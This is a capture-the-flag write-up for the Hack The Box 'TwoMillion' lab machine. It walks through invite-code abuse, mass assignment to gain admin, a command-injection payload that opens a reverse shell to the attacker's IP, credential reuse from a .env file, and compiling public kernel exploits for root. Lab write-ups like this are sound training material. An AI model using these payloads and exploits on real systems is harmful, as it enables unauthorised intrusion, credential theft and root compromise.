================================================================================
                    HTB TWOMILLION - COMPLETE WRITE-UP
================================================================================

TARGET IP     : 10.129.229.66
ATTACKER IP   : 10.10.16.5
DATE          : 2026-07-13

================================================================================
1. RECONNAISSANCE
================================================================================

nmap -sC -sV 10.129.229.66

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx

Added to /etc/hosts:
10.129.229.66 2million.htb

Open TCP Ports: 2 (22 - SSH, 80 - HTTP)

================================================================================
2. WEB ENUMERATION
================================================================================

Website: http://2million.htb - Old HackTheBox style platform
Key Pages: /login, /register, /invite, /api

Found JavaScript file: /js/inviteapi.min.js

================================================================================
3. INVITE CODE GENERATION
================================================================================

3.1 Deobfuscate JavaScript
--------------------------------------------------------------------------------

Original obfuscated code in inviteapi.min.js revealed two functions:
- verifyInviteCode(code) - Verifies invite code
- makeInviteCode() - Gets instructions for invite generation

3.2 Get ROT13 Instruction
--------------------------------------------------------------------------------

curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate

Response:
{
  "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
  "enctype": "ROT13"
}

Decoded (ROT13): "In order to generate the invite code, make a POST request to /api/v1/invite/generate"

3.3 Generate Invite Code
--------------------------------------------------------------------------------

curl -s -X POST http://2million.htb/api/v1/invite/generate | jq -r '.data.code' | base64 -d

Invite Code: QUX7L-XYKBF-QRFBH-ULGMZ

================================================================================
4. ACCOUNT REGISTRATION
================================================================================

4.1 Register Account
--------------------------------------------------------------------------------

URL: http://2million.htb/register
Username: htbuser
Email: htbuser@2million.htb
Password: htb123
Invite Code: QUX7L-XYKBF-QRFBH-ULGMZ

4.2 Login
--------------------------------------------------------------------------------

URL: http://2million.htb/login
Username: htbuser
Password: htb123

Session Cookie: PHPSESSID=mog4n4kd0mkkg0ghcth4bpib6l

================================================================================
5. API ENUMERATION
================================================================================

5.1 List API Endpoints
--------------------------------------------------------------------------------

curl -s http://2million.htb/api/v1 --cookie "PHPSESSID=mog4n4kd0mkkg0ghcth4bpib6l" | jq

{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}

Total Admin Endpoints: 3

================================================================================
6. PRIVILEGE ESCALATION - MASS ASSIGNMENT
================================================================================

6.1 Check Admin Status
--------------------------------------------------------------------------------

curl -s http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=mog4n4kd0mkkg0ghcth4bpib6l" | jq
{
  "message": false
}

6.2 Become Admin (Mass Assignment)
--------------------------------------------------------------------------------

curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=mog4n4kd0mkkg0ghcth4bpib6l" \
  -d '{"email":"htbuser@2million.htb","is_admin":1}' | jq

{
  "id": 15,
  "username": "htbuser",
  "is_admin": 1
}

6.3 Verify Admin Status
--------------------------------------------------------------------------------

curl -s http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=mog4n4kd0mkkg0ghcth4bpib6l" | jq
{
  "message": true
}

================================================================================
7. REMOTE CODE EXECUTION - COMMAND INJECTION
================================================================================

7.1 Test Command Injection
--------------------------------------------------------------------------------

curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=mog4n4kd0mkkg0ghcth4bpib6l" \
  -d '{"username":"test;id;"}'

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Vulnerable Parameter: username
Vulnerable Endpoint: POST /api/v1/admin/vpn/generate

7.2 Reverse Shell
--------------------------------------------------------------------------------

# Listener on Kali
nc -lvnp 4444

# Reverse shell payload
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Content-Type: application/json" \
  -H "Cookie: PHPSESSID=mog4n4kd0mkkg0ghcth4bpib6l" \
  -d '{"username":"test;bash -c '\''bash -i >& /dev/tcp/10.10.16.5/4444 0>&1'\'';"}'

================================================================================
8. USER FLAG
================================================================================

8.1 Extract .env Credentials
--------------------------------------------------------------------------------

cat /var/www/html/.env

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

8.2 SSH as Admin
--------------------------------------------------------------------------------

ssh admin@2million.htb
Password: SuperDuperPass123

8.3 User Flag
--------------------------------------------------------------------------------

admin@2million:~$ cat /home/admin/user.txt
546fd184792cdddcae961cc170d1f4f6

USER FLAG: 546fd184792cdddcae961cc170d1f4f6

================================================================================
9. PRIVILEGE ESCALATION - KERNEL EXPLOIT
================================================================================

9.1 Check Kernel Version
--------------------------------------------------------------------------------

admin@2million:~$ uname -r
5.15.70-051570-generic

Ubuntu 22.04.2 LTS
GLIBC 2.35-0ubuntu3.1

Vulnerable to: CVE-2023-0386 (OverlayFS)

9.2 Exploit Transfer
--------------------------------------------------------------------------------

# On Kali
git clone https://github.com/xkaneiki/CVE-2023-0386
zip -r cve.zip CVE-2023-0386

# Transfer to target
scp cve.zip admin@2million.htb:/tmp

9.3 Compile and Run Exploit
--------------------------------------------------------------------------------

# On target
cd /tmp
unzip cve.zip
cd CVE-2023-0386
make all

# Run exploit
./fuse ./ovlcap/lower ./gc &
./exp

# After successful exploit
root@2million:/tmp/CVE-2023-0386#

================================================================================
10. ROOT FLAG
================================================================================

root@2million:~# cat /root/root.txt
[INSERT_ROOT_FLAG_HERE]

ROOT FLAG: [INSERT_ROOT_FLAG_HERE]

================================================================================
11. ALTERNATIVE PRIVILEGE ESCALATION - LOONEY TUNABLES
================================================================================

11.1 CVE Information
--------------------------------------------------------------------------------

CVE ID: CVE-2023-4911
Name: Looney Tunables
Vulnerable Component: GNU C Library (glibc) dynamic loader (ld.so)
Affected Versions: glibc 2.34 - 2.37
Environment Variable: GLIBC_TUNABLES

11.2 Exploit
--------------------------------------------------------------------------------

# Using C optimized exploit
git clone https://github.com/jarpex/cve-2023-4911-exploit-optimized
cd cve-2023-4911-exploit-optimized
gcc -o exploit main.c
./exploit

# Using Python exploit
git clone https://github.com/guffre/CVE-2023-4911
cd CVE-2023-4911
python3 exploit.py

================================================================================
12. FLAG SUMMARY
================================================================================

USER FLAG: 546fd184792cdddcae961cc170d1f4f6
ROOT FLAG: [INSERT_ROOT_FLAG_HERE]

================================================================================
13. CREDENTIALS SUMMARY
================================================================================

Application Credentials:
- Username: htbuser
- Password: htb123

Database Credentials (.env):
- DB_USERNAME: admin
- DB_PASSWORD: SuperDuperPass123

SSH Credentials:
- Username: admin
- Password: SuperDuperPass123

================================================================================
14. VULNERABILITIES EXPLOITED
================================================================================

1. Invite Code Generation Abuse - Client-side JS exposure
2. Mass Assignment - PUT /api/v1/admin/settings/update
3. Command Injection - POST /api/v1/admin/vpn/generate (CVE style)
4. Credential Reuse - .env to SSH
5. CVE-2023-0386 - OverlayFS Kernel Exploit
6. CVE-2023-4911 - Looney Tunables (Alternative)

================================================================================
15. ATTACK CHAIN SUMMARY
================================================================================

1. Nmap scan → Ports 22 (SSH) and 80 (HTTP)
2. Web enumeration → /invite page with inviteapi.min.js
3. Deobfuscate JavaScript → Found /api/v1/invite/how/to/generate
4. ROT13 decode → POST to /api/v1/invite/generate
5. Base64 decode → Valid invite code
6. Register account with invite code
7. Login → Get PHPSESSID cookie
8. API enumeration → Found admin endpoints
9. Mass Assignment → Set is_admin=1 via PUT /api/v1/admin/settings/update
10. Command Injection → RCE via POST /api/v1/admin/vpn/generate
11. Reverse Shell → www-data
12. Read .env → admin:SuperDuperPass123
13. SSH as admin → User flag
14. Kernel Exploit → CVE-2023-0386 → Root
15. Root Flag

================================================================================
16. LESSONS LEARNED
================================================================================

1. Hidden JavaScript endpoints are often valuable for exploitation
2. API endpoint enumeration can reveal mass assignment vulnerabilities
3. Command injection can be found in administrative functions
4. Credential reuse between application and system accounts is a critical risk
5. Outdated kernels (5.15.70) are vulnerable to known exploits
6. GLIBC_TUNABLES can be used for privilege escalation via Looney Tunables

================================================================================
                            END OF WRITE-UP
================================================================================
